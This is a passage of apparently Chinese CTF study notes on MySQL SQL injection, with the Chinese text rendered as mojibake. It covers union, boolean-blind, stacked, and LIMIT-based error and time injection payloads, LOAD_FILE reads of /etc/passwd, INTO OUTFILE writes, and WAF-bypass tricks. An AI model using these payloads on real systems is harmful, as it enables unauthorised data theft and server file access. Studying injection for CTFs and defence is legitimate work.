<h4 id="15-è¯»å–æ–‡ä»¶"><a href="#15-è¯»å–æ–‡ä»¶" class="headerlink" title="15.è¯»å–æ–‡ä»¶:"></a>15.è¯»å–æ–‡ä»¶:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SELECT <span class="title function_ invoke__">LOAD_FILE</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="1-åŸºç¡€ç”¨æ³•"><a href="#1-åŸºç¡€ç”¨æ³•" class="headerlink" title="1.åŸºç¡€ç”¨æ³•"></a>1.åŸºç¡€ç”¨æ³•</h3><h4 id="1-å¸¸è§æŸ¥è¯¢å…³é”®å­—"><a href="#1-å¸¸è§æŸ¥è¯¢å…³é”®å­—" class="headerlink" title="1.å¸¸è§æŸ¥è¯¢å…³é”®å­—:"></a>1.å¸¸è§æŸ¥è¯¢å…³é”®å­—:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>  <span class="comment">--å­—æ®µæ•°æ¢æµ‹,æŸ¥çœ‹æœ‰å¤šå°‘åˆ—</span></span><br></pre></td></tr></table></figure>

<h4 id="2-å¸¸è§å‡½æ•°"><a href="#2-å¸¸è§å‡½æ•°" class="headerlink" title="2.å¸¸è§å‡½æ•°;"></a>2.å¸¸è§å‡½æ•°;</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> version()â€”â€”MySQLç‰ˆæœ¬</span><br><span class="line"><span class="number">2.</span> <span class="keyword">user</span>()â€”â€”æ•°æ®åº“ç”¨æˆ·å</span><br><span class="line"><span class="number">3.</span> database()â€”â€”æ•°æ®åº“å</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@datadir</span>â€”â€”æ•°æ®åº“è·¯å¾„</span><br><span class="line"><span class="number">5.</span> @<span class="variable">@version_compile_os</span>â€”â€”æ“ä½œç³»ç»Ÿç‰ˆæœ¬</span><br><span class="line"><span class="number">6.</span>concat(str1,str2,...)â€”â€”æ²¡æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</span><br><span class="line"><span class="number">7.</span>concat_ws(separator,str1,str2,...)â€”â€”å«æœ‰åˆ†éš”ç¬¦åœ°è¿æ¥å­—ç¬¦ä¸²</span><br><span class="line"><span class="number">8.</span>group_concat(str1,str2,...)â€”â€”è¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®</span><br></pre></td></tr></table></figure>

<h3 id="2-æ”»å‡»æ–¹å¼-ï¼›"><a href="#2-æ”»å‡»æ–¹å¼-ï¼›" class="headerlink" title="2.æ”»å‡»æ–¹å¼ ï¼›"></a>2.æ”»å‡»æ–¹å¼ ï¼›</h3><h4 id="1-è”åˆæ³¨å…¥"><a href="#1-è”åˆæ³¨å…¥" class="headerlink" title="1.è”åˆæ³¨å…¥:"></a>1.è”åˆæ³¨å…¥:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;æ•°æ®åº“å&#x27;</span>;â€”â€”â€”â€”<span class="operator">&gt;</span>çˆ†å‡ºè¡¨å</span><br><span class="line"><span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;è¡¨å&#x27;</span>;<span class="comment">---&gt;çˆ†å‡ºå­—æ®µ</span></span><br><span class="line"><span class="keyword">select</span> æ‰€éœ€å­—æ®µ <span class="keyword">from</span> è¡¨å <span class="keyword">where</span> æŸä¸€ä¸ªå­—æ®µ <span class="operator">=</span> <span class="string">&#x27;æŸå€¼&#x27;</span>       <span class="comment">--çˆ†å‡ºæŸä¸€å­—æ®µçš„æŸä¸€å¯¹åº”å€¼</span></span><br></pre></td></tr></table></figure>

<h5 id="è”åˆæ³¨å…¥å¸¸è§æµç¨‹"><a href="#è”åˆæ³¨å…¥å¸¸è§æµç¨‹" class="headerlink" title="è”åˆæ³¨å…¥å¸¸è§æµç¨‹:"></a>è”åˆæ³¨å…¥å¸¸è§æµç¨‹:</h5><table>
<thead>
<tr>
<th>æ­¥éª¤</th>
<th>SQLè¯­å¥</th>
<th>ç”¨é€”è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>â‘  æ¢å­—æ®µæ•°</td>
<td><code>&#39; ORDER BY 1--+</code> åˆ° <code>&#39; ORDER BY n--+</code></td>
<td>ç¡®å®šèƒ½ç”¨çš„åˆ—æ•°</td>
</tr>
<tr>
<td>â‘¡ æ‹¼è¿”å›åˆ—</td>
<td>â€˜ UNION SELECT 1,2,3â€“+</td>
<td>æ›¿æ¢æˆçœŸå®å­—æ®µ</td>
</tr>
<tr>
<td>â‘¢ æŸ¥å½“å‰åº“</td>
<td>UNION SELECT 1,2,database()â€“+</td>
<td>çˆ†æ•°æ®åº“å</td>
</tr>
<tr>
<td>â‘£ æŸ¥è¡¨å</td>
<td>group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€™xxxâ€™;</td>
<td>çˆ†æ‰€æœ‰è¡¨</td>
</tr>
<tr>
<td>â‘¤ æŸ¥å­—æ®µ</td>
<td>group_concat(column_name) from information_schema.columns where table_name&#x3D;â€™xxxâ€™;</td>
<td>çˆ†æ‰€æœ‰å­—æ®µ</td>
</tr>
<tr>
<td>â‘¥ æŸ¥å­—æ®µå€¼</td>
<td>select å­—æ®µå from è¡¨å where æ¡ä»¶</td>
<td>çˆ†å­—æ®µå†…å®¹</td>
</tr>
</tbody></table>
<h5 id="å¯ä»¥ç›´æ¥ä½¿ç”¨like"><a href="#å¯ä»¥ç›´æ¥ä½¿ç”¨like" class="headerlink" title="å¯ä»¥ç›´æ¥ä½¿ç”¨like:"></a>å¯ä»¥ç›´æ¥ä½¿ç”¨like:</h5><table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ç²¾ç¡®åŒ¹é…</td>
<td><code>username LIKE &#39;admin&#39;</code></td>
<td>ç­‰ä»·äº <code>=</code>ï¼Œä½†å¯ç»•è¿‡WAFæ‹¦æˆª <code>=</code></td>
</tr>
<tr>
<td>å‰ç¼€åŒ¹é…</td>
<td><code>username LIKE &#39;adm%&#39;</code></td>
<td>åŒ¹é…ä»¥ <code>adm</code> å¼€å¤´çš„å†…å®¹</td>
</tr>
<tr>
<td>åç¼€åŒ¹é…</td>
<td><code>username LIKE &#39;%min&#39;</code></td>
<td>åŒ¹é…ä»¥ <code>min</code> ç»“å°¾çš„å†…å®¹</td>
</tr>
<tr>
<td>ä¸­é—´åŒ¹é…</td>
<td><code>username LIKE &#39;%dm%&#39;</code></td>
<td>åŒ¹é…åŒ…å« <code>dm</code> çš„å†…å®¹</td>
</tr>
<tr>
<td>å•å­—ç¬¦åŒ¹é…</td>
<td><code>username LIKE &#39;a_din&#39;</code></td>
<td>åŒ¹é… <code>a+ä»»æ„å­—ç¬¦+din</code></td>
</tr>
<tr>
<td>ä»»æ„ä½ç½®å­—ç¬¦åŒ¹é…</td>
<td><code>flag LIKE &#39;ctfshow&#123;a________&#125;&#39;</code></td>
<td>ç”¨ <code>_</code> é™å®šä½æ•°ã€ä½ç½®ç›²æ³¨</td>
</tr>
<tr>
<td>éç©ºåŒ¹é…</td>
<td><code>flag LIKE &#39;%&#39;</code></td>
<td>åˆ¤æ–­æ˜¯å¦æœ‰å†…å®¹ï¼ˆä¸ä¸ºç©ºï¼‰</td>
</tr>
</tbody></table>
<h5 id="2-å¯¹è¿”å›ç»“æœçš„è¿‡æ»¤æ›¿æ¢-replace"><a href="#2-å¯¹è¿”å›ç»“æœçš„è¿‡æ»¤æ›¿æ¢-replace" class="headerlink" title="2.å¯¹è¿”å›ç»“æœçš„è¿‡æ»¤æ›¿æ¢(replace):"></a>2.å¯¹è¿”å›ç»“æœçš„è¿‡æ»¤æ›¿æ¢(replace):</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">REPLACE(str, from_str, to_str)</span><br><span class="line">                <span class="comment">-- strï¼šåŸå§‹å­—ç¬¦ä¸²</span></span><br><span class="line">                <span class="comment">-- from_strï¼šè¦æ›¿æ¢çš„å­ä¸²</span></span><br><span class="line">                <span class="comment">-- to_strï¼šæ›¿æ¢æˆçš„æ–°å­ä¸²</span></span><br><span class="line">REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(password,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;nine&#x27;</span>),<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;eight&#x27;</span>),<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;seven&#x27;</span>),<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;six&#x27;</span>),<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;five&#x27;</span>),<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;four&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;three&#x27;</span>),<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;two&#x27;</span>),<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;one&#x27;</span>),<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;zero&#x27;</span>) <span class="keyword">from</span> ctfshow_user4 <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h5 id="3-å¦‚æœå¯¹è¿”å›ç»“æœæœ‰è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥å½“å‰ç›®å½•çš„å…¶ä»–çš„æ–‡ä»¶"><a href="#3-å¦‚æœå¯¹è¿”å›ç»“æœæœ‰è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥å½“å‰ç›®å½•çš„å…¶ä»–çš„æ–‡ä»¶" class="headerlink" title="3.å¦‚æœå¯¹è¿”å›ç»“æœæœ‰è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥å½“å‰ç›®å½•çš„å…¶ä»–çš„æ–‡ä»¶;"></a>3.å¦‚æœå¯¹è¿”å›ç»“æœæœ‰è¿‡æ»¤ï¼Œä¹Ÿå¯ä»¥å°†å†…å®¹å†™å…¥å½“å‰ç›®å½•çš„å…¶ä»–çš„æ–‡ä»¶;</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; union select username, password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>flag.txt<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string">           --into outfile å°†å†…å®¹å†™å…¥æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h4 id="2-å¸ƒå°”ç›²æ³¨"><a href="#2-å¸ƒå°”ç›²æ³¨" class="headerlink" title="2.å¸ƒå°”ç›²æ³¨:"></a>2.å¸ƒå°”ç›²æ³¨:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å¸ƒå°”ç›²æ³¨æ˜¯ä¸€ç§ç›²<span class="keyword">SQL</span>æ³¨å…¥æ”»å‡»æ–¹å¼ï¼Œåˆ©ç”¨æœåŠ¡å™¨è¿”å›ç»“æœçš„çœŸå‡æ¡ä»¶åˆ¤æ–­ï¼ˆé€šå¸¸æ˜¯è¿”å›é¡µé¢çš„å·®å¼‚ï¼‰æ¥é€æ­¥çŒœæµ‹æ•°æ®åº“ä¸­çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ”»å‡»æ–¹æ³•</th>
<th>æ”»å‡»Payloadç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>æ¡ä»¶åˆ¤æ–­ï¼ˆConditionï¼‰</td>
<td><code>id=1 AND (SELECT COUNT(*) FROM users)&gt;0</code></td>
<td>æ ¹æ®è¿”å›ç»“æœçœŸå‡åˆ¤æ–­æ¡ä»¶æ˜¯å¦æˆç«‹</td>
</tr>
<tr>
<td>å­—ç¬¦é€ä½çŒœæµ‹ï¼ˆé€å­—ç¬¦åˆ¤æ–­ï¼‰</td>
<td><code>username=admin&#39; AND substr(password,1,1)=&#39;a&#39; -- </code></td>
<td>é€å­—ç¬¦é€æ­¥çŒœæµ‹å¯†ç </td>
</tr>
<tr>
<td>ASCIIèŒƒå›´é€æ­¥ç¼©å°ï¼ˆæŠ˜åŠæœç´¢ï¼‰</td>
<td><code>id=1 AND ASCII(substr((SELECT db()),1,1))&gt;97</code></td>
<td>æŠ˜åŠæœç´¢å¿«é€Ÿç¡®å®šå­—ç¬¦ASCIIç </td>
</tr>
<tr>
<td>å­—ç¬¦é•¿åº¦åˆ¤æ–­</td>
<td><code>id=1 AND LENGTH(database())=8</code></td>
<td>ç¡®è®¤æ•°æ®åº“åæˆ–æ•°æ®é•¿åº¦</td>
</tr>
<tr>
<td>çŒœæµ‹æ•°æ®æ¡æ•°</td>
<td><code>id=1 AND (SELECT COUNT(*) FROM users)=5</code></td>
<td>ç¡®è®¤è¡¨ä¸­è®°å½•æ•°é‡</td>
</tr>
</tbody></table>
<h5 id="1-åˆ¤æ–­æ–¹æ³•"><a href="#1-åˆ¤æ–­æ–¹æ³•" class="headerlink" title="1.åˆ¤æ–­æ–¹æ³•:"></a>1.åˆ¤æ–­æ–¹æ³•:</h5><table>
<thead>
<tr>
<th>æ­¥éª¤</th>
<th>æ”»å‡»æè¿°</th>
<th>æ”»å‡»ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>æ¢æµ‹æ³¨å…¥ç‚¹ï¼Œåˆæ­¥åˆ¤æ–­æ¡ä»¶</td>
<td><code>id=1 AND 1=1</code>(True), <code>id=1 AND 1=2</code>(False)</td>
</tr>
<tr>
<td>2</td>
<td>åˆ¤æ–­æ•°æ®åº“é•¿åº¦</td>
<td><code>id=1 AND LENGTH(database())=8</code></td>
</tr>
<tr>
<td>3</td>
<td>æšä¸¾æ•°æ®åº“å</td>
<td><code>id=1 AND substr(database(),1,1)=&#39;c&#39;</code></td>
</tr>
<tr>
<td>4</td>
<td>æšä¸¾æ•°æ®è¡¨</td>
<td><code>id=1 AND substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)=&#39;u&#39;</code></td>
</tr>
<tr>
<td>5</td>
<td>æšä¸¾å­—æ®µã€è®°å½•æ•°æ®</td>
<td><code>id=1 AND substr((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;users&#39; LIMIT 0,1),1,1)=&#39;p&#39;</code></td>
</tr>
<tr>
<td>6</td>
<td>é€å­—ç¬¦çŒœæµ‹æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ç”¨æˆ·å¯†ç ï¼‰</td>
<td><code>id=1 AND substr((SELECT password FROM users LIMIT 0,1),1,1)=&#39;a&#39;</code></td>
</tr>
</tbody></table>
<h4 id="3-å †å æ³¨å…¥"><a href="#3-å †å æ³¨å…¥" class="headerlink" title="3.å †å æ³¨å…¥:"></a>3.å †å æ³¨å…¥:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">åœ¨ä¸€æ¡ <span class="keyword">SQL</span> è¯­å¥ååŠ  ; å†å†™å¦ä¸€æ¡è¯­å¥ï¼Œä¸€æ¬¡æ‰§è¡Œå¤šæ¡ <span class="keyword">SQL</span></span><br></pre></td></tr></table></figure>

<h5 id="1-row-0"><a href="#1-row-0" class="headerlink" title="1.row(0):"></a>1.row(0):</h5><h6 id="row-0-çš„çœŸå®å«ä¹‰ï¼š"><a href="#row-0-çš„çœŸå®å«ä¹‰ï¼š" class="headerlink" title="$row[0] çš„çœŸå®å«ä¹‰ï¼š"></a><code>$row[0]</code> çš„çœŸå®å«ä¹‰ï¼š</h6><ul>
<li><code>$pdo-&gt;query(...)-&gt;fetch()</code> é»˜è®¤è¿”å›ä¸€ä¸ªæ•°ç»„</li>
<li>ç´¢å¼•æ–¹å¼ <code>$row[0]</code> è¡¨ç¤º <strong>æŸ¥è¯¢ç»“æœçš„ç¬¬ä¸€åˆ—å€¼</strong></li>
</ul>
<h4 id="4-Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•-ORDER-BYä¹‹å"><a href="#4-Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•-ORDER-BYä¹‹å" class="headerlink" title="4.Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•(ORDER BYä¹‹å)"></a>4.Mysqlä¸‹Limitæ³¨å…¥æ–¹æ³•(ORDER BYä¹‹å)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">å¦‚æœå‰é¢ï¼Œæ²¡æœ‰<span class="keyword">order</span> <span class="keyword">by</span> ç›´æ¥é€šè¿‡ <span class="keyword">union</span> æ³¨å…¥</span><br><span class="line">åœ¨LIMITåé¢å¯ä»¥è·Ÿä¸¤ä¸ªå‡½æ•°ï¼Œ<span class="keyword">PROCEDURE</span> å’Œ <span class="keyword">INTO</span>ï¼Œ<span class="keyword">INTO</span>é™¤éæœ‰å†™å…¥shellçš„æƒé™ï¼Œå¦åˆ™æ˜¯æ— æ³•åˆ©ç”¨çš„</span><br></pre></td></tr></table></figure>

<h5 id="1-åŸºäºæŠ¥é”™æ³¨å…¥çš„limit"><a href="#1-åŸºäºæŠ¥é”™æ³¨å…¥çš„limit" class="headerlink" title="1.åŸºäºæŠ¥é”™æ³¨å…¥çš„limit:"></a>1.åŸºäºæŠ¥é”™æ³¨å…¥çš„limit:</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>); </span><br></pre></td></tr></table></figure>

<h5 id="2-åŸºäºæ—¶é—´æ³¨å…¥"><a href="#2-åŸºäºæ—¶é—´æ³¨å…¥" class="headerlink" title="2.åŸºäºæ—¶é—´æ³¨å…¥;"></a>2.åŸºäºæ—¶é—´æ³¨å…¥;</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">5000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>











<h2 id="å¸¸è§æŸ¥è¯¢ç”¨æ³•"><a href="#å¸¸è§æŸ¥è¯¢ç”¨æ³•" class="headerlink" title="å¸¸è§æŸ¥è¯¢ç”¨æ³•"></a>å¸¸è§æŸ¥è¯¢ç”¨æ³•</h2><h3 id="1-æŸ¥è¯¢æŸå¼ è¡¨ä¸­åä¸ºpassçš„å­—æ®µ"><a href="#1-æŸ¥è¯¢æŸå¼ è¡¨ä¸­åä¸ºpassçš„å­—æ®µ" class="headerlink" title="1.æŸ¥è¯¢æŸå¼ è¡¨ä¸­åä¸ºpassçš„å­—æ®µ"></a>1.æŸ¥è¯¢æŸå¼ è¡¨ä¸­åä¸ºpassçš„å­—æ®µ</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(pass) <span class="keyword">FROM</span> users;</span><br><span class="line">          è¿™æ˜¯è¦æŸ¥è¯¢æŸå¼ è¡¨ä¸­åä¸º pass çš„å­—æ®µæœ‰å¤šå°‘æ¡è®°å½•</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>åœºæ™¯</th>
<th>æ˜¯å¦éœ€è¦ &#96;&#96;&#96;</th>
<th>ç†ç”±</th>
</tr>
</thead>
<tbody><tr>
<td>å­—æ®µåæ˜¯ä¿ç•™å­—ï¼ˆå¦‚ <code>user</code>, <code>pass</code>, <code>count</code>ï¼‰</td>
<td>âœ… å¿…é¡»</td>
<td></td>
</tr>
<tr>
<td>ä¿è¯å¤§å°å†™æ•æ„Ÿä¸€è‡´</td>
<td>âœ… æ¨è</td>
<td></td>
</tr>
<tr>
<td>è¡¨å&#x2F;å­—æ®µåä¸­æœ‰ç‰¹æ®Šå­—ç¬¦æˆ–ç©ºæ ¼</td>
<td>âœ… å¿…é¡»</td>
<td></td>
</tr>
<tr>
<td>æƒ³ç»•è¿‡ WAF è¿‡æ»¤å­—æ®µå…³é”®å­—</td>
<td>âœ… å»ºè®®ä½¿ç”¨</td>
<td></td>
</tr>
<tr>
<td>æ™®é€šå­—æ®µåã€è¡¨å</td>
<td>âŒ å¯é€‰ï¼Œä¸å¼ºåˆ¶</td>
<td></td>
</tr>
</tbody></table>
<h3 id="2-é€šé…ç¬¦"><a href="#2-é€šé…ç¬¦" class="headerlink" title="2.é€šé…ç¬¦:"></a>2.é€šé…ç¬¦:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">like</span> flag&#123;<span class="operator">%</span>   </span><br><span class="line">        <span class="comment">--#æ˜¯é€šé…ç¬¦</span></span><br></pre></td></tr></table></figure>

<h3 id="3-æŸ¥è¯¢æ–‡ä»¶å†…å®¹å‡½æ•°"><a href="#3-æŸ¥è¯¢æ–‡ä»¶å†…å®¹å‡½æ•°" class="headerlink" title="3.æŸ¥è¯¢æ–‡ä»¶å†…å®¹å‡½æ•°:"></a>3.æŸ¥è¯¢æ–‡ä»¶å†…å®¹å‡½æ•°:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">load_file()     <span class="comment">---æŸ¥è¯¢å‡½æ•°</span></span><br><span class="line">substr()   <span class="comment">--æå–å‡½æ•°   --ç­‰ä»·äº substring()</span></span><br></pre></td></tr></table></figure>



<h4 id="load-file-æŸ¥è¯¢å‡½æ•°"><a href="#load-file-æŸ¥è¯¢å‡½æ•°" class="headerlink" title="load_file()æŸ¥è¯¢å‡½æ•°:"></a>load_file()æŸ¥è¯¢å‡½æ•°:</h4><table>
<thead>
<tr>
<th>é¡¹ç›®</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td><strong>å‡½æ•°åç§°</strong></td>
<td><code>load_file(path)</code></td>
</tr>
<tr>
<td><strong>ç”¨é€”</strong></td>
<td>ä» <strong>MySQL æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿ</strong> ä¸­è¯»å–æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶å†…å®¹</td>
</tr>
<tr>
<td><strong>å¸¸è§ç”¨é€”</strong></td>
<td>æ–‡ä»¶è¯»å–æ¼æ´åˆ©ç”¨ï¼ˆå¦‚è¯»å– <code>/etc/passwd</code>ã€Web ç›®å½•æºç ç­‰ï¼‰</td>
</tr>
<tr>
<td><strong>è¿”å›ç±»å‹</strong></td>
<td><code>LONGTEXT</code>ï¼ˆå³æ–‡æœ¬å†…å®¹ï¼‰</td>
</tr>
<tr>
<td><strong>å…¸å‹ç”¨æ³•</strong></td>
<td><code>SELECT load_file(&#39;/etc/passwd&#39;);</code></td>
</tr>
<tr>
<td><strong>å‰ææ¡ä»¶</strong></td>
<td>MySQL å…·æœ‰ <code>FILE</code> æƒé™è·¯å¾„æ–‡ä»¶å­˜åœ¨MySQL ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶æœ‰<strong>è¯»æƒé™</strong>ç³»ç»Ÿæœªé™åˆ¶ secure_file_priv</td>
</tr>
</tbody></table>
<h4 id="substr-æå–å‡½æ•°"><a href="#substr-æå–å‡½æ•°" class="headerlink" title="substr()æå–å‡½æ•°:"></a>substr()æå–å‡½æ•°:</h4><table>
<thead>
<tr>
<th>é¡¹ç›®</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td><strong>å‡½æ•°åç§°</strong></td>
<td><code>substr(str, pos, len)</code></td>
</tr>
<tr>
<td><strong>ç”¨é€”</strong></td>
<td>ä»å­—ç¬¦ä¸² <code>str</code> ä¸­æå–ä» <code>pos</code> ä½ç½®å¼€å§‹ï¼Œé•¿åº¦ä¸º <code>len</code> çš„å­ä¸²</td>
</tr>
<tr>
<td><strong>ç­‰ä»·å‡½æ•°</strong></td>
<td>MySQL ä¸­è¿˜æœ‰ä¸ªç­‰ä»·å‡½æ•°å« <code>substring()</code></td>
</tr>
<tr>
<td><strong>è¿”å›å€¼</strong></td>
<td>å­—ç¬¦ä¸²çš„å­ä¸²</td>
</tr>
<tr>
<td><strong>å…¸å‹ç”¨æ³•</strong></td>
<td><code>SELECT substr(&#39;flag&#123;12345&#125;&#39;, 6, 1);</code>  â†’ è¿”å› <code>&#39;1&#39;</code></td>
</tr>
</tbody></table>
<h3 id="4-ä¸‰å…ƒè¡¨è¾¾å¼"><a href="#4-ä¸‰å…ƒè¡¨è¾¾å¼" class="headerlink" title="4.ä¸‰å…ƒè¡¨è¾¾å¼;"></a>4.ä¸‰å…ƒè¡¨è¾¾å¼;</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">IF(expr, val_if_true, val_if_false)</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>éƒ¨åˆ†</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td><code>expr</code></td>
<td>æ¡ä»¶åˆ¤æ–­è¡¨è¾¾å¼ï¼ˆå¯ä»¥æ˜¯å¸ƒå°”ã€æ¯”è¾ƒç­‰ï¼‰</td>
</tr>
<tr>
<td><code>val_if_true</code></td>
<td>å¦‚æœæ¡ä»¶ä¸º <code>true</code>ï¼Œè¿”å›è¿™ä¸ªå€¼ï¼ˆè¿™é‡Œæ˜¯ <code>1</code>ï¼‰</td>
</tr>
<tr>
<td><code>val_if_false</code></td>
<td>å¦åˆ™è¿”å›è¿™ä¸ªå€¼ï¼ˆè¿™é‡Œæ˜¯ <code>0</code>ï¼‰</td>
</tr>
</tbody></table>
<h3 id="5-æŸ¥è¯¢å½“å‰æ•°æ®åº“æœ‰å‡ å¼ è¡¨-å­—æ®µ"><a href="#5-æŸ¥è¯¢å½“å‰æ•°æ®åº“æœ‰å‡ å¼ è¡¨-å­—æ®µ" class="headerlink" title="5.æŸ¥è¯¢å½“å‰æ•°æ®åº“æœ‰å‡ å¼ è¡¨(å­—æ®µ):"></a>5.æŸ¥è¯¢å½“å‰æ•°æ®åº“æœ‰å‡ å¼ è¡¨(å­—æ®µ):</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">æŸ¥è¯¢æœ‰å‡ å¼ è¡¨:</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()</span><br><span class="line"> (<span class="keyword">select</span> <span class="built_in">count</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()) <span class="operator">=</span> <span class="number">2</span></span><br><span class="line"> æŸ¥è¯¢ç¬¬ä¸€å¼ è¡¨å:</span><br><span class="line"> <span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">   substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database() limit <span class="number">0</span>, <span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> #</span><br><span class="line"> æŸ¥è¯¢å­—æ®µä¸ªæ•°:</span><br><span class="line"> <span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> </span><br><span class="line"> æŸ¥è¯¢ä¸€ä¸ªè¡¨çš„å­—æ®µï¼š</span><br><span class="line"> <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema <span class="operator">=</span> database() <span class="keyword">and</span> table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"> çˆ†æ•°æ®:</span><br><span class="line"> ascii(substr((<span class="keyword">SELECT</span> åˆ—å <span class="keyword">FROM</span> è¡¨å), N, <span class="number">1</span>))<span class="operator">=</span>X</span><br></pre></td></tr></table></figure>



<h3 id="6-åˆ†é¡µlimitçš„ç”¨æ³•"><a href="#6-åˆ†é¡µlimitçš„ç”¨æ³•" class="headerlink" title="6.åˆ†é¡µlimitçš„ç”¨æ³•:"></a>6.åˆ†é¡µlimitçš„ç”¨æ³•:</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT æ˜¯ åˆ†é¡µåˆ©å™¨ï¼Œå¯ç”¨äº æ§åˆ¶ç»“æœæ•°é‡ã€å®šä½ç›®æ ‡è®°å½•ã€ç»•è¿‡é™åˆ¶çˆ†ç ´ã€‚</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ ¼å¼</th>
<th>åŠŸèƒ½è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
